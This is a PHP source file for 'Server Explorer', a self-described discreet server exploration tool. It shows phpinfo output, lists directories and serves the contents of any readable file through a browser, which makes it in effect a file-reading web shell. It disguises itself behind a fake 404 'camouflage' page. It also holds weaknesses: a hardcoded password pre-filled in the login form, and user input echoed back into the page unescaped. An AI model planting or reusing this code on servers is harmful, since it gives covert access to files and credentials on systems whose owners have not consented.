<?php // see https://github.com/jimmybear217/serverExplorer

    // application settings
    $settings = array(
        "explorer" => array(
            "enabled" => true,
            "display_errors" => true,
            "use_remote_assets" => true,
            "assets_server" => "https://jimmybear217.dev/projects/repo/server_explorer/serverExplorer/assets",
            "assets_fileIcons_server" => "https://jimmybear217.dev/projects/repo/auto-mime-icon/www/mime-icon.php"
        ),
        "auth" => array(
            "require_auth" => true,
            "ip_whitelist" => array(
                "enabled" => false,
                "authorised_ips" => array("127.0.0.1")
            ),
            "user_password" => array(
                "enabled" => false,
                "server" => "https://jimmybear217.dev/projects/repo/server_explorer/userAuthServer.php"
            ),
            "app_password" => array(
                "enabled" => true,
                "hash" => password_hash("SuperSecurePassword", PASSWORD_DEFAULT)
            ),
            "2FA" => array(
                "enabled" => false,
                "server" => "https://jimmybear217.dev/projects/repo/server_explorer/2fa.php"
            ),
            "DemoMode" => array(
                "enabled" => true,
                "username" => "",
                "password" => "SuperSecurePassword"
            )
        )
    );

    // logs
    if ($settings["explorer"]["display_errors"]) {
        error_reporting(E_ALL);
        ini_set('display_errors', 1);
    } else {
        error_reporting(0);
        ini_set('display_errors', 0);
    }

    // remote assets configuration
    $remote_assets = array(
        "favicon" => array(
            "actual" => $settings["explorer"]["assets_server"] . '/serverExplorer.png',
            "backup" => 'https://github.com/favicon.ico'
        ),
        "stylesheet" => $settings["explorer"]["assets_server"] . '/style.css',
        "logo" => $settings["explorer"]["assets_server"] . '/serverExplorer.png'
    );

    // pages content
    $pages = array(
        "camouflage"    => '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">'
                        . '<html><head><title>404 Not Found</title></head><body>'
                        . '<h1>Not Found</h1><p>The requested URL was not found on this server.</p>'
                        . ((!empty($_SERVER["SERVER_SIGNATURE"])) ? '<hr>' . $_SERVER["SERVER_SIGNATURE"] : "" )
                        . '</body></html>',
        "header"        => '<!DOCTYPE HTML><html><head><title>Server Explorer' . (!empty($_GET["command"]) ? ' $> ' . $_GET["command"] : '') . '</title><link rel="icon" href="'
                        . (($settings["explorer"]["use_remote_assets"]) ? $remote_assets["favicon"]["actual"] : $remote_assets["favicon"]["backup"])
                        . '">' . (($settings["explorer"]["use_remote_assets"]) ? '<link rel="stylesheet" href="' . $remote_assets["stylesheet"] . '">' : '')
                        . '</head><body><header><h1><a href="' . $_SERVER["PHP_SELF"] . '?action=submit&command=" style="text-decoration: none;color: currentColor;">'
                        . (($settings["explorer"]["use_remote_assets"]) ? '<img src="' . $remote_assets["logo"] . '" height="32" width="32"> ' : '')
                        . 'Server Explorer</a></h1></header><div id="output">',
        "input"         => '</div><div id="input"><form action="' . $_SERVER["PHP_SELF"] . '" method="GET">'
                        . '<input type="hidden" name="action" value="submit">'
                        . '<input name="command" type="text" placeholder="$>" value="' . (isset($_GET['command']) ? $_GET['command'] : "") . '"><input type="submit" value="send (or press enter)">'
                        . '</form>',
        "login"         => '</h3>Please log in</h3><div id="login"><form action="' . $_SERVER["PHP_SELF"] . '?action=login" method="POST">'
                        . (($settings["auth"]["user_password"]["enabled"]) ? '<input name="username" placeholder="username" type="text" autocomplete="username" value="' . (($settings["auth"]["DemoMode"]["enabled"]) ? $settings["auth"]["DemoMode"]["username"] : "") . '">' : "")
                        . (($settings["auth"]["user_password"]["enabled"] || $settings["auth"]["app_password"]["enabled"]) ? '<input name="password" placeholder="password" type="password" autocomplete="username" value="' . (($settings["auth"]["DemoMode"]["enabled"]) ? $settings["auth"]["DemoMode"]["password"] : "") . '">' : "")
                        . '<input value="login (or press enter)" type="submit">',
        "footer"        => '</body></html>'
    );


    // check if system is enabled
    if (!$settings["explorer"]["enabled"]) {
        http_response_code(404);
        die($pages["camouflage"]);
    }

    // check if authentification is enabled
    if ($settings["auth"]["require_auth"]) {
        $login_state = false;
        $login_nextstep = "input";
        // check whitelist
        if ($settings["auth"]["ip_whitelist"]["enabled"] && !$login_state) {
            if (!in_array($_SERVER["REMOTE_ADDR"], $settings["auth"]["ip_whitelist"]["authorised_ips"])) {
                http_response_code(404);
                die ($pages["camouflage"]);
            }
        }
        if ($settings["auth"]["user_password"]["enabled"] && !$login_state) {
            // check user password
            if (isset($_GET["action"]) && $_GET["action"] == "login") {
                if (!empty($_POST["username"]) && !empty($_POST["password"])) {
                    $username = filter_var($_POST["username"], FILTER_SANITIZE_STRING);
                    $ch = curl_init($settings["auth"]["user_password"]["server"] . "?action=checkUsrPwd");
                    curl_setopt_array($ch, array(
                        "CURLOPT_RETURNTRANSFER" => true,
                        "CURLOPT_HEADER" => false,
                        "CURLOPT_HTTPHEADER" => array("Content-Type: multipart/form-data"),
                        "CURLOPT_POST" => true,
                        "CURLOPT_POSTFIELDS" => array("username" => $username, "password" => $_POST["password"])
                    ));
                    if (intval(curl_exec($ch)) == 1) {
                        $token = base64_encode($username . ":" . password_hash($username . date("Y", time()) . $_SERVER["SCRIPT_FILENAME"], PASSWORD_DEFAULT));
                        setcookie("auth_user", $token, time()+(60*60), $_SERVER["PHP_SELF"]);
                        $login_state = true;
                    }
                }
            } else if (in_array("auth_user", array_keys($_COOKIE))) {
                // check password token
                $token = explode(":", base64_decode($_COOKIE["auth_user"]));
                if (password_verify($token[0] . date("Y", time()) . $_SERVER["SCRIPT_FILENAME"], $token[1])) {
                    $login_state = true;
                } else {
                    setcookie("auth_user", "", time() - (60*60));
                    $login_state = false;
                }
            }
        } else if ($settings["auth"]["app_password"]["enabled"] && !$login_state) {
            // check app password
            if (isset($_GET["action"]) && $_GET["action"] == "login") {
                if (!empty($_POST["password"])) {
                    if (password_verify($_POST["password"], $settings["auth"]["app_password"]["hash"])) {
                        $token = password_hash("app" . date("Y", time()) . $_SERVER["SCRIPT_FILENAME"], PASSWORD_DEFAULT);
                        setcookie("auth_app", $token, time()+(60*60), $_SERVER["PHP_SELF"]);
                        $login_state = true;
                    }
                }
            } else if (in_array("auth_app", array_keys($_COOKIE))) {
                // check password token
                $token = "app" . date("Y", time()) . $_SERVER["SCRIPT_FILENAME"];
                if (password_verify($token, $_COOKIE["auth_app"])) {
                    $login_state = true;
                } else {
                    setcookie("auth_app", "", time() - (60*60));
                    $login_state = false;
                }
            }
        }
        if ($login_nextstep == "input" && $login_state) {
            $login_nextstep = "ok";
        }
        // check 2FA
        if ($settings["auth"]["2FA"]["enabled"] && $login_state){
            if (in_array("auth_2fa", array_keys($_COOKIE))) {
                // check 2FA token
                if (intval(file_get_contents($settings["auth"]["2FA"]["server"] . "?action=check&token=" . $_COOKIE["auth_2fa"])) != 1) {
                    $login_state = false;
                }
            } else {
                // send 2FA request
                $token = file_get_contents($settings["auth"]["2FA"]["server"] . "?action=submit");
                if (!empty($token) && strlen($token) < 300 && strlen($token) > 30) {
                    setcookie("auth_2fa", $token, time()+(60*60), $_SERVER["PHP_SELF"]);
                    $login_nextstep = "2fa";
                }
            }
        }
        if (!$login_state) {
            if ($settings["auth"]["user_password"]["enabled"] || $settings["auth"]["app_password"]["enabled"]) {
                die ($pages["header"] . $pages["login"] . $pages["footer"]);
            } else if ($settings["auth"]["2FA"]["enabled"]) {
                http_response_code(404);
                die ($pages["camouflage"]);
            }
        }
    }

    // load commands
    $commandList = array(
        "help" => "displays this help message",
        "phpinfo" => "displays the output of the phpinfo command. very useful to get inteligence on the server",
        "fs" => "interact with the File System. Type `fs help` for a list of commands you can use with fs.",
        "db" => "interact with a MySQL database. Type `db help` for a list of commands you can use with db.",
    );
    $commandListFS = array(
        'help' => 'show this help message',
        'ls' => 'lists the content of the specifed directory. defaults to the current directory.',
        'open' => 'opens the specified file',
        /*'rm' => 'deletes the specified file if possible',
        'touch' => 'creates an empty file where specified',
        'download' => 'download the specified address to the disk at the specified location'*/
    );

    function isFunctionAvailable($func) {
        if (ini_get('safe_mode')) return false;
        $disabled = ini_get('disable_functions');
        if ($disabled) {
            $disabled = explode(',', $disabled);
            $disabled = array_map('trim', $disabled);
            return !in_array($func, $disabled);
        }
        return true;
    }

    function command_welcome($argv=array()) {
        echo '<p>Welcome to Server Explorer.<br>This tool will let you explore this server in several ways and as discretely'
            . ' as possible. Don\'t forget that unless you have been allowed to use this system (like in Jimmy\'s Demo) or'
            . ' in your own setup, your actions may be subject to legal consequences as you would be accessing someone else'
            . '\'s system without their consent. So, any action of yours, is your own responsability. Happy Exploring :)</p>';
        command_help();
        echo '<p>If you have any questions, problem or suggestion, free to contact me at <a href="mailto:serverExplorer@jimmybear217.dev">serverExplorer@jimmybear217.dev</a> '
            . 'or to raise an issue on <a href="https://github.com/jimmybear217/serverExplorer" target="_blank">GitHub.com/jimmybear217/serverExplorer</a>. Thank you.</p>';
    }

    function command_help($argv=array()) {
        global $commandList;
        echo '<h3>Available Commands:</h3><table>'
            . '<tr><th>Command</th><th>Description</th>';
        foreach(array_keys($commandList) as $command) {
            echo '<tr><td><a href="' . $_SERVER["PHP_SELF"] . '?action=submit&command=' . $command . '">' . $command . '</a></td><td>' . $commandList[$command] . '</td></tr>';
        }
        echo '</table>';
    }

    function command_phpinfo($argv=array()) {
        if (isset($argv[0])) {
            phpinfo($argv[0]);
        } else {
            phpinfo();
        }
    }

    function command_fs($argv=array("ls", ".")) {
        // set fs command list
        global $commandListFS;
        // read first argument
        if (empty($argv)) {
            command_fs_help($argv);
            command_fs_ls(array("."));
        } else {
            $comm = array_shift($argv);
            if (empty($argv)) $argv = array(".");
            if (in_array($comm, array_keys($commandListFS))) {
                if (function_exists("command_fs_" . $comm)) {
                    call_user_func_array("command_fs_" . $comm, array($argv));
                } else {
                    echo '<p class="error">Unable to run this <b>F</b>ile<b>S</b>ystem command</p>';
                }
            } else {
                echo '<p class="error">Unknown <b>F</b>ile<b>S</b>ystem command</p>';
                command_fs_help($argv);
            }
        }
    }

    function command_fs_help($argv=array()) {
        global $commandListFS;
        echo '<h3>Available <b>F</b>ile<b>S</b>ystem commands</h3><table>'
            . '<tr><th>Command</th><th>Description</th>';
        foreach(array_keys($commandListFS) as $command) {
            echo '<tr><td><a href="' . $_SERVER['PHP_SELF'] . '?action=submit&command=fs%20' . $command . '">fs ' . $command . '</td><td>' . $commandListFS[$command] . '</td></tr>';
        }
        echo '</table>';
    }

    function command_fs_ls($argv=array(".")) {
        global $settings;
        if (empty($argv)) $argv = array(getcwd());
        $path = realpath($argv[0]);
        if ($path == false) {
            $path = realpath(".");
            echo '<p class="error">the path could not be found: <span class="path">' . $argv[0] . '</span><br>'
                . 'reverting to current directory: <span class="path">' . $path . '</span></p>';
        }
        echo '<h3>Contents of <span class="path">' . $path . '</span></h3>';
        if (isFunctionAvailable("scandir")) {
            if (is_readable($path)) {
                $fstat = array("dev", "ino", "mode", "nlink", "uid", "gid", "rdev", "size", "atime", "mtime", "ctime", "blksize", "blocks");
                echo '<table>'
                    . '<tr><th></th><th>Filename</th><th>' . implode('</th><th>', $fstat) . '</th></tr>';
                foreach(scandir($path) as $file) {
                    echo '<tr>';
                    $realFile = realpath($path . "/" . $file);
                    $fileMime = ((is_readable($realFile)) ? mime_content_type($realFile) : "unreadable");
                    $file_stats = stat($path);
                    echo '<td><img src="' . ($settings["explorer"]["use_remote_assets"] ? $settings["explorer"]["assets_fileIcons_server"] : "//localhost/") . '?mime=' . urlencode($fileMime) . '&filename=' . urlencode($file) . '" height="24" width="24" alt="' . $fileMime . '" title="' . $fileMime . '"></td>';
                    if ($fileMime == "unreadable") {
                        echo '<td>' . $file . '</td>';
                    } else if (is_dir($realFile)) {
                        echo '<td><a href="' . $_SERVER["PHP_SELF"] . '?action=submit&command=fs ls ' . urlencode("'" . $realFile . "'") . '">' . $file . '/</a></td>';
                    } else {
                        echo '<td><a href="' . $_SERVER["PHP_SELF"] . '?action=submit&command=fs open ' . urlencode("'" . $realFile . "'") . '">' . $file . '</a></td>';
                    }
                    $file_stats=stat($path);
                    foreach ($fstat as $statKey) {
                        echo "<td>" . json_encode($file_stats[$statKey]) . "</td>";
                    }
                    echo '</tr>';
                }
                echo '</table>';
            } else {
                echo '<p class="error">This folder is not readable<ul>'
                    . '<li><a href="' . $_SERVER["PHP_SELF"] . '?action=submit&command=fs ls \'' . realpath($path . "/..") . '\'">Up</a></li>'
                    . '<li><a href="javascript:history.go(-1);">Back</a></li></ul></p>';
            }
        } else {
            echo '<p class="error">This function is not available on this server</p>';
        }
    }

    function command_fs_open($argv=array()) {
        if (empty($argv[0])) {
            echo '<p class="error">no file was passed as a parameter</p>';
        } else {
            $file = realpath($argv[0]);
            if ($file == false) {
                echo '<p class="error">the file ' . $file . ' could not be found</p>';
            } else {
                echo '<h3>Contents of ' . basename($file) . '</h3>'
                    . '<iframe style="width: 100%; height: 60vh" class="output-iframe" src="' . $_SERVER["PHP_SELF"] . '?action=fopen&file=' . urlencode($file) . '"></iframe>';
            }
        }

    }

    
    
    // interpret commands
    if (isset($_GET["action"]) && $_GET["action"] == "submit" && !empty($_GET["command"])) {
        echo $pages["header"];
        $commandArr = explode(' ', $_GET["command"]);
        $command = array();
        $commandArr_flag_quote = false;
        $commandArr_validQuotes = array("'", urlencode("'"), '"', urlencode('"'), "`", urlencode("`"));
        // read command including quotes
        echo '<p class="command">$&gt; ';
        foreach ($commandArr as $word) {
            $containsQuotes = 0;
            $wordQuoteless = str_replace($commandArr_validQuotes, "", $word, $containsQuotes);
            if ($commandArr_flag_quote) {
                $command[count($command)-1] .= " " . $wordQuoteless;
            } else {
                echo '<span class="command_part">';
                array_push($command, $wordQuoteless);
            }
            echo $wordQuoteless . " ";
            if ($containsQuotes) {
                $commandArr_flag_quote=!$commandArr_flag_quote;
            }
            if (!$commandArr_flag_quote) {
                echo '</span>';
            }
        }
        echo '</p>';
        if (in_array($command[0], array_keys($commandList))) {
            $comm = array_shift($command);
            $argv = $command;
            if (function_exists("command_" . $comm)) {
                call_user_func_array("command_" . $comm, array($argv));
            } else {
                echo '<p class="error">Unable to run this command</p>';
            }
        } else {
            // unknown input
            echo '<p class="error">I\'m sorry, this command is not valid.</p>';
            command_help();
        }
        echo $pages["input"] . $pages["footer"];

    } else if (isset($_GET["action"]) && $_GET["action"] == "fopen") {
        
        // is file specified?
        if (empty($_GET["file"])) {
            header("Content-Type: text/plain", true, 400);
            die("please specify the file");
        }

        // does file exist?
        $file = realpath($_GET["file"]);
        if ($file == false) {
            header("Content-Type: text/plain", true, 400);
            die("error: the specified file could not be found");
        }

        // is file not a directory
        if (is_dir($file)) {
            header("Content-Type: text/plain", true, 400);
            die("error: this file is a directory");
        }

        // is readable
        if (!is_readable($file)) {
            header("Content-Type: text/plain", true, 400);
            die("error: this file is not readable");
        }

        if (!filesize($file)) {
            header("Content-Type: text/plain", true, 200);
            die("error: this file has not content");
        }
            
        header("Content-Type: " . mime_content_type($file), true, 200);
        echo file_get_contents($file);
            
    } else {
        echo $pages["header"];
        // show welcome command
        command_welcome();
        echo $pages["input"] . $pages["footer"];
    }
    
